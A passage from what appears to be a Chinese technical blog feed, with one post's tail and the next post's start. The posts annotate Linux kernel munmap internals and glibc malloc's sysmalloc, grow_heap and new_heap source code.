<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">static void detach_vmas_to_be_unmapped(struct mm_struct *mm, struct vm_area_struct *vma,</div><div class="line">    struct vm_area_struct *prev, unsigned long end)&#123;</div><div class="line"></div><div class="line">    struct vm_area_struct **insertion_point;</div><div class="line">    struct vm_area_struct *tail_vma = NULL;</div><div class="line"></div><div class="line">    insertion_point = (prev ? &amp;prev-&gt;vm_next : &amp;mm-&gt;mmap);</div><div class="line">    vma-&gt;vm_prev = NULL;</div><div class="line">    do &#123;</div><div class="line">        vma_rb_erase(vma, &amp;mm-&gt;mm_rb);</div><div class="line">        mm-&gt;map_count--;</div><div class="line">        tail_vma = vma;</div><div class="line">        vma = vma-&gt;vm_next;</div><div class="line">    &#125; while (vma &amp;&amp; vma-&gt;vm_start &lt; end);</div><div class="line">    *insertion_point = vma;</div><div class="line">    if (vma) &#123;</div><div class="line">        vma-&gt;vm_prev = prev;</div><div class="line">        vma_gap_update(vma);</div><div class="line">    &#125; else</div><div class="line">        mm-&gt;highest_vm_end = prev ? prev-&gt;vm_end : 0;</div><div class="line">    tail_vma-&gt;vm_next = NULL;</div><div class="line"></div><div class="line">    vmacache_invalidate(mm);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>回到<code>do_munmap</code>中，<code>unmap_region</code>就是用于释放内存了。下面来看，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">static void unmap_region(struct mm_struct *mm,</div><div class="line">        struct vm_area_struct *vma, struct vm_area_struct *prev,</div><div class="line">        unsigned long start, unsigned long end)&#123;</div><div class="line"></div><div class="line">    struct vm_area_struct *next = prev ? prev-&gt;vm_next : mm-&gt;mmap;</div><div class="line">    struct mmu_gather tlb;</div><div class="line"></div><div class="line">    lru_add_drain();</div><div class="line">    tlb_gather_mmu(&amp;tlb, mm, start, end);</div><div class="line">    update_hiwater_rss(mm);</div><div class="line">    unmap_vmas(&amp;tlb, vma, start, end);</div><div class="line">    free_pgtables(&amp;tlb, vma, prev ? prev-&gt;vm_end : FIRST_USER_ADDRESS,</div><div class="line">                 next ? next-&gt;vm_start : USER_PGTABLES_CEILING);</div><div class="line">    tlb_finish_mmu(&amp;tlb, start, end);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>lru_add_drain</code>用于将<code>percpu</code>变量<code>pagevec</code>对应的每个<code>page</code>放回其对应的<code>zone</code>的<code>lru</code>链表中，因为马上要解映射了，这些缓存的page变量由可能被改变。<br><code>tlb_gather_mmu</code>构造了一个<code>mmu_gather</code>变量并初始化。<br>接下来的<code>unmap_vmas</code>用于解映射，即释放存在物理页面映射的虚拟内存，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">void unmap_vmas(struct mmu_gather *tlb, struct vm_area_struct *vma, unsigned long start_addr, unsigned long end_addr)&#123;</div><div class="line"></div><div class="line">    struct mm_struct *mm = vma-&gt;vm_mm;</div><div class="line"></div><div class="line">    mmu_notifier_invalidate_range_start(mm, start_addr, end_addr);</div><div class="line">    for ( ; vma &amp;&amp; vma-&gt;vm_start &lt; end_addr; vma = vma-&gt;vm_next)</div><div class="line">        unmap_single_vma(tlb, vma, start_addr, end_addr, NULL);</div><div class="line">    mmu_notifier_invalidate_range_end(mm, start_addr, end_addr);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里开始遍历<code>vma</code>链表，对每个<code>vma</code>调用<code>unmap_single_vma</code>进行释放，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">static void unmap_single_vma(struct mmu_gather *tlb, struct vm_area_struct *vma,                        unsigned long start_addr, unsigned long end_addr, struct zap_details *details)&#123;</div><div class="line">    unsigned long start = max(vma-&gt;vm_start, start_addr);</div><div class="line">    unsigned long end;</div><div class="line"></div><div class="line">    if (start &gt;= vma-&gt;vm_end)</div><div class="line">        return;</div><div class="line">    end = min(vma-&gt;vm_end, end_addr);</div><div class="line">    if (end &lt;= vma-&gt;vm_start)</div><div class="line">        return;</div><div class="line"></div><div class="line">    if (vma-&gt;vm_file)</div><div class="line">        uprobe_munmap(vma, start, end);</div><div class="line"></div><div class="line">    if (unlikely(vma-&gt;vm_flags &amp; VM_PFNMAP))</div><div class="line">        untrack_pfn(vma, 0, 0);</div><div class="line"></div><div class="line">    if (start != end) &#123;</div><div class="line">        if (unlikely(is_vm_hugetlb_page(vma))) &#123;</div><div class="line">            if (vma-&gt;vm_file) &#123;</div><div class="line">                i_mmap_lock_write(vma-&gt;vm_file-&gt;f_mapping);</div><div class="line">                __unmap_hugepage_range_final(tlb, vma, start, end, NULL);</div><div class="line">                i_mmap_unlock_write(vma-&gt;vm_file-&gt;f_mapping);</div><div class="line">            &#125;</div><div class="line">        &#125; else</div><div class="line">            unmap_page_range(tlb, vma, start, end, details);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里主要就是通过<code>unmap_page_range</code>进行释放。再往下因为涉及太多linux内核内存管理的知识，这里就不深入分析了，最后就是通过虚拟地址找到页表<code>pte</code>，解开和物理页面之间的映射，并设置一些page结构。<br>由于<code>unmap_vmas</code>后，一些页表里没有了相对应的物理页面，<code>free_pgtables</code>将这些页表释放。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">void free_pgtables(struct mmu_gather *tlb, struct vm_area_struct *vma,</div><div class="line">        unsigned long floor, unsigned long ceiling)&#123;</div><div class="line"></div><div class="line">    while (vma) &#123;</div><div class="line">        struct vm_area_struct *next = vma-&gt;vm_next;</div><div class="line">        unsigned long addr = vma-&gt;vm_start;</div><div class="line"></div><div class="line">        unlink_anon_vmas(vma);</div><div class="line">        unlink_file_vma(vma);</div><div class="line"></div><div class="line">        if (is_vm_hugetlb_page(vma)) &#123;</div><div class="line">            hugetlb_free_pgd_range(tlb, addr, vma-&gt;vm_end,</div><div class="line">                floor, next? next-&gt;vm_start: ceiling);</div><div class="line">        &#125; else &#123;</div><div class="line"></div><div class="line">            while (next &amp;&amp; next-&gt;vm_start &lt;= vma-&gt;vm_end + PMD_SIZE</div><div class="line">                   &amp;&amp; !is_vm_hugetlb_page(next)) &#123;</div><div class="line">                vma = next;</div><div class="line">                next = vma-&gt;vm_next;</div><div class="line">                unlink_anon_vmas(vma);</div><div class="line">                unlink_file_vma(vma);</div><div class="line">            &#125;</div><div class="line">            free_pgd_range(tlb, addr, vma-&gt;vm_end,</div><div class="line">                floor, next? next-&gt;vm_start: ceiling);</div><div class="line">        &#125;</div><div class="line">        vma = next;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里主要是调用<code>free_pgd_range</code>。该函数中，假设要释放的虚拟内存为vma，其前一个vma为<code>prev</code>，后一个为<code>last</code>，如果释放完<code>vma</code>后，<code>prev-&gt;vm_end</code>到<code>last-&gt;vm_start</code>大于一个pgd管理的内存大小（32位系统下为4MB），就释放pgd里的所有页表，如果小于4MB，就什么也不做返回。</p>
<p>再回到<code>do_munmap</code>中，<code>arch_unmap</code>是一些体系结构相关的操作，不管它。<code>remove_vma_list</code>释放每个<code>vma</code>对应的<code>vm_area_struct</code>结构至slab分配器中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">static void remove_vma_list(struct mm_struct *mm, struct vm_area_struct *vma)&#123;</div><div class="line">    unsigned long nr_accounted = 0;</div><div class="line"></div><div class="line">    update_hiwater_vm(mm);</div><div class="line">    do &#123;</div><div class="line">        long nrpages = vma_pages(vma);</div><div class="line"></div><div class="line">        if (vma-&gt;vm_flags &amp; VM_ACCOUNT)</div><div class="line">            nr_accounted += nrpages;</div><div class="line">        vm_stat_account(mm, vma-&gt;vm_flags, vma-&gt;vm_file, -nrpages);</div><div class="line">        vma = remove_vma(vma);</div><div class="line">    &#125; while (vma);</div><div class="line">    vm_unacct_memory(nr_accounted);</div><div class="line">    validate_mm(mm);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>主要的函数是<code>remove_vma</code>，该函数通过<code>kmem_cache_free</code>释放对应的<code>vma</code>，并返回链表上的下一个<code>vma</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">static struct vm_area_struct *remove_vma(struct vm_area_struct *vma)&#123;</div><div class="line"></div><div class="line">    struct vm_area_struct *next = vma-&gt;vm_next;</div><div class="line"></div><div class="line">    might_sleep();</div><div class="line">    if (vma-&gt;vm_ops &amp;&amp; vma-&gt;vm_ops-&gt;close)</div><div class="line">        vma-&gt;vm_ops-&gt;close(vma);</div><div class="line">    if (vma-&gt;vm_file)</div><div class="line">        fput(vma-&gt;vm_file);</div><div class="line">    mpol_put(vma_policy(vma));</div><div class="line">    kmem_cache_free(vm_area_cachep, vma);</div><div class="line">    return next;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;free源码分析—-libc-free&quot;&gt;&lt;a href=&quot;#free源码分析—-libc-free&quot; class=&quot;headerlink&quot; title=&quot;free源码分析—__libc_free&quot;&gt;&lt;/a&gt;free源码分析—__libc_free&lt;/h1&gt;&lt;p&gt;
    
    </summary>
    
      <category term="pwn" scheme="http://yoursite.com/categories/pwn/"/>
    
    
      <category term="heap" scheme="http://yoursite.com/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>malloc源码分析——5</title>
    <link href="http://yoursite.com/2018/05/21/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E2%80%94%E2%80%945/"/>
    <id>http://yoursite.com/2018/05/21/malloc源码分析——5/</id>
    <published>2018-05-21T06:42:38.000Z</published>
    <updated>2018-05-21T06:54:27.244Z</updated>
    
    <content type="html"><![CDATA[<h1 id="malloc源码分析—sysmalloc"><a href="#malloc源码分析—sysmalloc" class="headerlink" title="malloc源码分析—sysmalloc"></a>malloc源码分析—sysmalloc</h1><p>本章主要分析<code>sysmalloc</code>的代码，在《malloc源码分析—2》中已经分析了部分<code>sysmalloc</code>的代码，主要用于对分配区进行初始化。本章查看余下的代码，</p>
<h2 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div></pre></td><td class="code"><pre><div class="line">static void * sysmalloc(INTERNAL_SIZE_T nb, mstate av) &#123;</div><div class="line">    mchunkptr old_top;</div><div class="line">    INTERNAL_SIZE_T old_size;</div><div class="line">    char *old_end;</div><div class="line"></div><div class="line">    long size;</div><div class="line">    char *brk;</div><div class="line"></div><div class="line">    long correction;</div><div class="line">    char *snd_brk;</div><div class="line"></div><div class="line">    INTERNAL_SIZE_T front_misalign;</div><div class="line">    INTERNAL_SIZE_T end_misalign;</div><div class="line">    char *aligned_brk;</div><div class="line"></div><div class="line">    mchunkptr p;</div><div class="line">    mchunkptr remainder;</div><div class="line">    unsigned long remainder_size;</div><div class="line"></div><div class="line">    size_t pagesize = GLRO(dl_pagesize);</div><div class="line">    bool tried_mmap = false;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    old_top = av-&gt;top;</div><div class="line">    old_size = chunksize(old_top);</div><div class="line">    old_end = (char *) (chunk_at_offset(old_top, old_size));</div><div class="line">    brk = snd_brk = (char *) (MORECORE_FAILURE);</div><div class="line"></div><div class="line">    if (av != &amp;main_arena) &#123;</div><div class="line">        heap_info *old_heap, *heap;</div><div class="line">        size_t old_heap_size;</div><div class="line"></div><div class="line">        old_heap = heap_for_ptr(old_top);</div><div class="line">        old_heap_size = old_heap-&gt;size;</div><div class="line">        if ((long) (MINSIZE + nb - old_size) &gt; 0</div><div class="line">                &amp;&amp; grow_heap(old_heap, MINSIZE + nb - old_size) == 0) &#123;</div><div class="line">            av-&gt;system_mem += old_heap-&gt;size - old_heap_size;</div><div class="line">            arena_mem += old_heap-&gt;size - old_heap_size;</div><div class="line">            set_head(old_top,</div><div class="line">                    (((char *) old_heap + old_heap-&gt;size) - (char *) old_top) | PREV_INUSE);</div><div class="line">        &#125; else if ((heap = new_heap(nb + (MINSIZE + sizeof(*heap)), mp_.top_pad))) &#123;</div><div class="line">            heap-&gt;ar_ptr = av;</div><div class="line">            heap-&gt;prev = old_heap;</div><div class="line">            av-&gt;system_mem += heap-&gt;size;</div><div class="line">            arena_mem += heap-&gt;size;</div><div class="line">            top (av) = chunk_at_offset(heap, sizeof(*heap));</div><div class="line">            set_head(top (av), (heap-&gt;size - sizeof (*heap)) | PREV_INUSE);</div><div class="line"></div><div class="line">            old_size = (old_size - MINSIZE ) &amp; ~MALLOC_ALIGN_MASK;</div><div class="line">            set_head(chunk_at_offset (old_top, old_size + 2 * SIZE_SZ),</div><div class="line">                    0 | PREV_INUSE);</div><div class="line">            if (old_size &gt;= MINSIZE) &#123;</div><div class="line">                set_head(chunk_at_offset (old_top, old_size),</div><div class="line">                        (2 * SIZE_SZ) | PREV_INUSE);</div><div class="line">                set_foot(chunk_at_offset (old_top, old_size), (2 * SIZE_SZ));</div><div class="line">                set_head(old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);</div><div class="line">                _int_free(av, old_top, 1);</div><div class="line">            &#125; else &#123;</div><div class="line">                set_head(old_top, (old_size + 2 * SIZE_SZ) | PREV_INUSE);</div><div class="line">                set_foot(old_top, (old_size + 2 * SIZE_SZ));</div><div class="line">            &#125;</div><div class="line">        &#125; else if (!tried_mmap)</div><div class="line">            goto try_mmap;</div><div class="line">    &#125;</div><div class="line">    else&#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>首先，<code>old_top</code>、<code>old_size</code>和<code>old_end</code>分别保存了top chunk的指针，大小以及尾部的地址。<br>如果是非主分配区，首先通过<code>heap_for_ptr</code>获得原top chunk对应的<code>heap_info</code>指针，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#define heap_for_ptr(ptr) \</div><div class="line">  ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1)))</div></pre></td></tr></table></figure>
<p>对于非主分配区，因为每个heap是按照<code>HEAP_MAX_SIZE</code>的大小分配且对齐的，而每个topchunk存在于每个heap的剩余空间（高地址处），因此通过<code>heap_for_ptr</code>就能取出<code>heap_info</code>指针，<code>heap_info</code>保存了每个heap的相关信息。获得<code>heap_info</code>指针后，就能获得该heap当前被使用的大小并将其保存在<code>old_heap_size</code>中。<br>根据《malloc源码分析—4》，进入到sysmalloc前会尝试在top chunk分配内存，因此代码执行到这里肯定失败了。所以这里只有<code>MINSIZE + nb - old_size&gt;0</code>这一种情况，即这时的top chunk空间不足了，因此首先通过<code>grow_heap</code>尝试向heap的高地址处增加heap当前使用的大小，即top chunk的大小，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">static int grow_heap(heap_info *h, long diff) &#123;</div><div class="line">    size_t pagesize = GLRO(dl_pagesize);</div><div class="line">    long new_size;</div><div class="line"></div><div class="line">    diff = ALIGN_UP(diff, pagesize);</div><div class="line">    new_size = (long) h-&gt;size + diff;</div><div class="line">    if ((unsigned long) new_size &gt; (unsigned long) HEAP_MAX_SIZE)</div><div class="line">        return -1;</div><div class="line"></div><div class="line">    if ((unsigned long) new_size &gt; h-&gt;mprotect_size) &#123;</div><div class="line">        if (__mprotect((char *) h + h-&gt;mprotect_size,</div><div class="line">                (unsigned long) new_size - h-&gt;mprotect_size,</div><div class="line">                PROT_READ | PROT_WRITE) != 0)</div><div class="line">            return -2;</div><div class="line"></div><div class="line">        h-&gt;mprotect_size = new_size;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    h-&gt;size = new_size;</div><div class="line">    LIBC_PROBE(memory_heap_more, 2, h, h-&gt;size);</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这段代码其实最关键的是<code>h-&gt;size = new_size</code>这一样，表示重新设置heap的大小至<code>new_size</code>。<br>回到sysmalloc中，假设<code>grow_heap</code>成功，即将top chunk的大小设置为<code>MINSIZE + nb</code>，则重新设置分配区使用的内存大小，并且设置top chunk的<code>size</code>至新值（注意这里的<code>size</code>不能直接设置为<code>MINSIZE + nb</code>是因为在<code>grow_heap</code>中有对齐操作）。</p>
<p>假设<code>grow_heap</code>失败，大部分情况下说明heap的使用大小已经接近其最大值<code>HEAP_MAX_SIZE</code>了，此时只能通过<code>new_heap</code>重新分配一个heap，注意传入的参数<code>mp_.top_pad</code>表示在分配内存时，额外多分配的内存。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">static heap_info * internal_function new_heap(size_t size, size_t top_pad) &#123;</div><div class="line">    size_t pagesize = GLRO(dl_pagesize);</div><div class="line">    char *p1, *p2;</div><div class="line">    unsigned long ul;</div><div class="line">    heap_info *h;</div><div class="line"></div><div class="line">    if (size + top_pad &lt; HEAP_MIN_SIZE)</div><div class="line">        size = HEAP_MIN_SIZE;</div><div class="line">    else if (size + top_pad &lt;= HEAP_MAX_SIZE)</div><div class="line">        size += top_pad;</div><div class="line">    else if (size &gt; HEAP_MAX_SIZE)</div><div class="line">        return 0;</div><div class="line">    else</div><div class="line">        size = HEAP_MAX_SIZE;</div><div class="line">    size = ALIGN_UP(size, pagesize);</div><div class="line"></div><div class="line">    p2 = MAP_FAILED;</div><div class="line">    if (aligned_heap_area) &#123;</div><div class="line">        p2 = (char *) MMAP(aligned_heap_area, HEAP_MAX_SIZE, PROT_NONE,</div><div class="line">                MAP_NORESERVE);</div><div class="line">        aligned_heap_area = NULL;</div><div class="line">        if (p2 != MAP_FAILED &amp;&amp; ((unsigned long) p2 &amp; (HEAP_MAX_SIZE - 1))) &#123;</div><div class="line">            __munmap(p2, HEAP_MAX_SIZE);</div><div class="line">            p2 = MAP_FAILED;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    if (p2 == MAP_FAILED) &#123;</div><div class="line">        p1 = (char *) MMAP(0, HEAP_MAX_SIZE &lt;&lt; 1, PROT_NONE, MAP_NORESERVE);</div><div class="line">        if (p1 != MAP_FAILED) &#123;</div><div class="line">            p2 = (char *) (((unsigned long) p1 + (HEAP_MAX_SIZE - 1))</div><div class="line">                    &amp; ~(HEAP_MAX_SIZE - 1));</div><div class="line">            ul = p2 - p1;</div><div class="line">            if (ul)</div><div class="line">                __munmap(p1, ul);</div><div class="line">            else</div><div class="line">                aligned_heap_area = p2 + HEAP_MAX_SIZE;</div><div class="line">            __munmap(p2 + HEAP_MAX_SIZE, HEAP_MAX_SIZE - ul);</div><div class="line">        &#125; else &#123;</div><div class="line">            p2 = (char *) MMAP(0, HEAP_MAX_SIZE, PROT_NONE, MAP_NORESERVE);</div><div class="line">            if (p2 == MAP_FAILED)</div><div class="line">                return 0;</div><div class="line"></div><div class="line">            if ((unsigned long) p2 &amp; (HEAP_MAX_SIZE - 1)) &#123;</div><div class="line">                __munmap(p2, HEAP_MAX_SIZE);</div><div class="line">                return 0;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    if (__mprotect(p2, size, PROT_READ | PROT_WRITE) != 0) &#123;</div><div class="line">        __munmap(p2, HEAP_MAX_SIZE);</div><div class="line">        return 0;</div><div class="line">    &#125;</div><div class="line">    h = (heap_info *) p2;</div><div class="line">    h-&gt;size = size;</div><div class="line">    h-&gt;mprotect_size = size;</div><div class="line">    LIBC_PROBE(memory_heap_new, 2, h, h-&gt;size);</div><div class="line">    return h;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>首先对需要分配的内存大小size做相应的调整。<code>aligned_heap_area</code>表示上一次<code>MMAP</code>分配后的结束地址，如果存在，就首先尝试从该地址分配大小为<code>HEAP_MAX_SIZE</code>的内存。<code>MMAP</code>最后是系统调用，对应的内核函数在《malloc源码分析—2》中已经介绍过了，这里只是一些标志位的区别。分配完后，会检查地址是否对齐，如果不对齐也是失败。<br>如果第一次分配失败了，就会再尝试一次，这次分配<code>HEAP_MAX_SIZE*2</code>大小的内存，并且新内存的起始地址由内核决定。因为尝试分配了<code>HEAP_MAX_SIZE*2</code>大小的内存，其中必定包含了大小为<code>HEAP_MAX_SIZE</code>且和<code>HEAP_MAX_SIZE</code>对齐的内存，因此一旦分配成功，就从中截取出这部分内存。<br>如果连第二次也分配失败了，就会通过<code>MMAP</code>进行第三次分配，这次只分配<code>HEAP_MAX_SIZE</code>大小的内存，并且起始地址由内核决定，如果又失败了就返回0。<br>如果三面三次分配内存任何一次成功，就设置相应的可读写位置，并且返回分配区的<code>heap_info</code>指针。</p>
<p>重新回到<code>sysmalloc</code>中，假设分配成功，就会对刚刚分配得到的heap做相应的设置，其中<code>ar_ptr</code>表示所属的分配区的指针，<code>prev</code>表示上一个heap，所有的heap通过<code>prev</code>形成单向链表，然后通过<code>set_head</code>设置av分配区top chunk的<code>size</code>，这里也可以看出，对于刚分配的heap，包含了<code>heap_info</code>指针、top chunk、以及大于size的未被使用的部分。<br>再接下来就要对原来的top chunk进行最后的处理，这里假设对齐，如果原top chunk的大小不够大，就将其分割成<code>old_size + 2 * SIZE_SZ</code>和<code>2 * SIZE_SZ</code>大小；如果原top chunk的大小足够大，就将其分割成<code>old_size</code>，<code>2 * SIZE_SZ</code>和<code>2 * SIZE_SZ</code>大小，并通过<code>_int_free</code>进行释放。</p>
<h2 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h2><p>继续往下看<code>sysmalloc</code>，上面一部分代码主要是针对非主分配区的操作，下面的这段代码就是针对主分配区的操作了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">static void * sysmalloc(INTERNAL_SIZE_T nb, mstate av) &#123;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    if (av != &amp;main_arena) &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    else&#123;</div><div class="line">        size = nb + mp_.top_pad + MINSIZE;</div><div class="line">        if (contiguous(av))</div><div class="line">            size -= old_size;</div><div class="line">        size = ALIGN_UP(size, pagesize);</div><div class="line"></div><div class="line">        if (size &gt; 0) &#123;</div><div class="line">            brk = (char *) (MORECORE(size));</div><div class="line">            LIBC_PROBE (memory_sbrk_more, 2, brk, size);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if (brk != (char *) (MORECORE_FAILURE)) &#123;</div><div class="line">            void (*hook)(void) = atomic_forced_read (__after_morecore_hook);</div><div class="line">            if (__builtin_expect (hook != NULL, 0))</div><div class="line">            (*hook)();</div><div class="line">        &#125;</div><div class="line">        else&#123;</div><div class="line">            if (contiguous (av))</div><div class="line">                size = ALIGN_UP (size + old_size, pagesize);</div><div class="line"></div><div class="line">            if ((unsigned long) (size) &lt; (unsigned long) (MMAP_AS_MORECORE_SIZE))</div><div class="line">                size = MMAP_AS_MORECORE_SIZE;</div><div class="line"></div><div class="line">            if ((unsigned long) (size) &gt; (unsigned long) (nb))&#123;</div><div class="line">                char *mbrk = (char *) (MMAP (0, size, PROT_READ | PROT_WRITE, 0));</div><div class="line"></div><div class="line">                if (mbrk != MAP_FAILED)&#123;</div><div class="line">                    brk = mbrk;</div><div class="line">                    snd_brk = brk + size;</div><div class="line">                    set_noncontiguous (av);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    